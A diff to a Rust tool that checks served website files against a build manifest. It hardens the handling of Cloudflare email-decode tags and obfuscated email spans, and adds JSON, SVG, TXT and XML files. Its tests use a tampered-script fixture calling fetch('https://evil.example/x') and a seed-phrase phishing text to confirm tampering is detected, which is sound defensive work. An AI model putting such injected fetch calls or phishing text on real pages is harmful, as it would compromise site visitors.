@@ -36,6 +36,11 @@ const BEACON_SRC: &str = "https://static.cloudflareinsights.com/beacon.min.js";
 const EMAIL_DECODE_SRC: &str =
     r"^/cdn-cgi/scripts/[0-9a-f]+/cloudflare-static/email-decode\.min\.js$";
 
+/// SHA-256 of each `email-decode.min.js` body known to be Cloudflare's. Empty
+/// until a trusted copy is recorded: a page carrying that tag then fails the
+/// check, because an edge could serve any script at the path it names.
+const CF_EMAIL_DECODE_SHA256: &[&str] = &[];
+
 /// Cloudflare's bot-detection bootstrap, which the edge adds to HTML pages.
 /// Its text is fixed apart from the per-request ray id and token, so the whole
 /// element is matched exactly: a script that differs by one byte is not removed.
@@ -55,12 +60,20 @@ static CF_MAIL_HREF: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
     Regex::new(r#"<a href="/cdn-cgi/l/email-protection#([0-9a-fA-F]+)""#)
         .expect("static pattern compiles")
 });
+// Only Cloudflare's placeholder text is replaced: any other visible text stays
+// in the compared string, so a rewritten span cannot hide behind a matching hex.
 static CF_MAIL_TEXT: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-    Regex::new(r#"<span class="__cf_email__" data-cfemail="([0-9a-fA-F]+)">[^<]*</span>"#)
+    Regex::new(r#"<span class="__cf_email__" data-cfemail="([0-9a-fA-F]+)">\[email&#160;protected\]</span>"#)
         .expect("static pattern compiles")
 });
 static EMAIL_DECODE: std::sync::LazyLock<Regex> =
     std::sync::LazyLock::new(|| Regex::new(EMAIL_DECODE_SRC).expect("static pattern compiles"));
+// The tag's attributes must be exactly Cloudflare's: `src`, optionally preceded
+// by `data-cfasync="false"`. Any extra attribute makes it an ordinary script.
+static EMAIL_DECODE_TAG: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+    Regex::new(r#"^\s*(?:data-cfasync="false"\s+)?src="([^"]*)"\s*$"#)
+        .expect("static pattern compiles")
+});
 static TAG: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
     Regex::new(r"(?is)<(script|link)\b[^>]*>").expect("static pattern compiles")
 });
@@ -103,11 +116,43 @@ fn cf_decode(hex: &str) -> Option<String> {
 }
 
 fn is_cloudflare_script(attrs: &str) -> bool {
-    let Some(src) = attr(attrs, "src") else {
-        return false;
-    };
-    let beacon = src.starts_with(BEACON_SRC) && attrs.contains("data-cf-beacon=");
-    beacon || EMAIL_DECODE.is_match(&src)
+    let beacon = attr(attrs, "src").is_some_and(|src| src.starts_with(BEACON_SRC))
+        && attrs.contains("data-cf-beacon=");
+    beacon || email_decode_src(attrs).is_some()
+}
+
+/// The `src` of a bare Cloudflare email-decode tag, or `None` for any other tag.
+fn email_decode_src(attrs: &str) -> Option<String> {
+    let src = EMAIL_DECODE_TAG
+        .captures(attrs)?
+        .get(1)?
+        .as_str()
+        .to_string();
+    EMAIL_DECODE.is_match(&src).then_some(src)
+}
+
+/// Sources of the email-decode tags `normalize` erases from this HTML.
+fn erased_email_decode_srcs(html: &str) -> Vec<String> {
+    SCRIPT_TAG
+        .captures_iter(html)
+        .filter_map(|c| email_decode_src(&c[1]))
+        .collect()
+}
+
+/// Counts an erased email-decode tag whose file is not a pinned Cloudflare copy.
+/// The tag is removed before hashing, so the file it names must be checked here.
+fn unpinned_email_decode(live: &Path, src: &str) -> usize {
+    let rel = src.trim_start_matches('/');
+    let pinned = fs::read(live.join(rel)).is_ok_and(|bytes| {
+        let got = hex::encode(Sha256::digest(&bytes));
+        CF_EMAIL_DECODE_SHA256.contains(&got.as_str())
+    });
+    if pinned {
+        0
+    } else {
+        println!("MISMATCH {rel} unpinned email-decode script");
+        1
+    }
 }
 
 /// Undoes Cloudflare's own rewrites so built and served HTML compare equal.
@@ -152,8 +197,13 @@ fn extension(rel: &str) -> Option<&str> {
     Path::new(rel).extension().and_then(|e| e.to_str())
 }
 
+/// Every text-like file the site serves: feeds, sitemaps and robots.txt included,
+/// so a changed one is a difference like any page.
 fn is_served(rel: &str) -> bool {
-    matches!(extension(rel), Some("html" | "js" | "mjs" | "css"))
+    matches!(
+        extension(rel),
+        Some("html" | "js" | "mjs" | "css" | "json" | "svg" | "txt" | "xml")
+    )
 }
 
 fn collect(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
@@ -218,6 +268,12 @@ fn check(manifest_path: &Path, live: &Path) -> Result<usize, String> {
                 if got != expected {
                     println!("MISMATCH {rel} expected={expected} got={got}");
                     mismatches += 1;
+                }
+                if extension(rel) == Some("html") {
+                    let html = String::from_utf8_lossy(&bytes);
+                    for src in erased_email_decode_srcs(&html) {
+                        mismatches += unpinned_email_decode(live, &src);
+                    }
                 }
             }
         }
@@ -342,6 +398,55 @@ mod tests {
         let tampered = genuine.replace("var l=", "fetch('https://evil.example/x');var l=");
         let served_bad = format!("<html><body><p>x</p>{tampered}</body></html>");
         assert_ne!(normalize(&served_bad), normalize(built));
+    }
+
+    #[test]
+    fn email_decode_tag_with_extra_attribute_is_compared() {
+        let tag = r#"<script async src="/cdn-cgi/scripts/0a1b/cloudflare-static/email-decode.min.js"></script>"#;
+        let served = PAGE.replace("</body>", &format!("{tag}</body>"));
+        assert_ne!(normalize(&served), normalize(PAGE));
+    }
+
+    #[test]
+    fn email_decode_tag_is_erased_but_its_file_must_be_pinned() {
+        let dist = scratch("decode-dist");
+        fs::write(dist.join("index.html"), PAGE).unwrap();
+        let mpath = dist.join("manifest.json");
+        fs::write(&mpath, build_manifest(&dist, "abc").unwrap().to_string()).unwrap();
+        let live = scratch("decode-live");
+        let tag = r#"<script data-cfasync="false" src="/cdn-cgi/scripts/0a1b/cloudflare-static/email-decode.min.js"></script>"#;
+        fs::write(
+            live.join("index.html"),
+            PAGE.replace("</body>", &format!("{tag}</body>")),
+        )
+        .unwrap();
+        fs::create_dir_all(live.join("cdn-cgi/scripts/0a1b/cloudflare-static")).unwrap();
+        fs::write(
+            live.join("cdn-cgi/scripts/0a1b/cloudflare-static/email-decode.min.js"),
+            "fetch('https://evil.example/x')",
+        )
+        .unwrap();
+        assert_eq!(
+            check(&mpath, &live).unwrap(),
+            1,
+            "unpinned payload at the decode path"
+        );
+    }
+
+    #[test]
+    fn email_span_text_other_than_placeholder_is_compared() {
+        let built = r#"<p><span class="__cf_email__" data-cfemail="91d4">[email&#160;protected]</span></p>"#;
+        let served = r#"<p><span class="__cf_email__" data-cfemail="91d4">Send your seed phrase to this address</span></p>"#;
+        assert_ne!(normalize(served), normalize(built));
+    }
+
+    #[test]
+    fn json_feeds_are_in_the_manifest() {
+        let dist = scratch("feed-dist");
+        fs::write(dist.join("index.html"), PAGE).unwrap();
+        fs::write(dist.join("progress.json"), "{}").unwrap();
+        let manifest = build_manifest(&dist, "abc").unwrap();
+        assert!(manifest["files"]["progress.json"].is_string());
     }
 
     #[test]
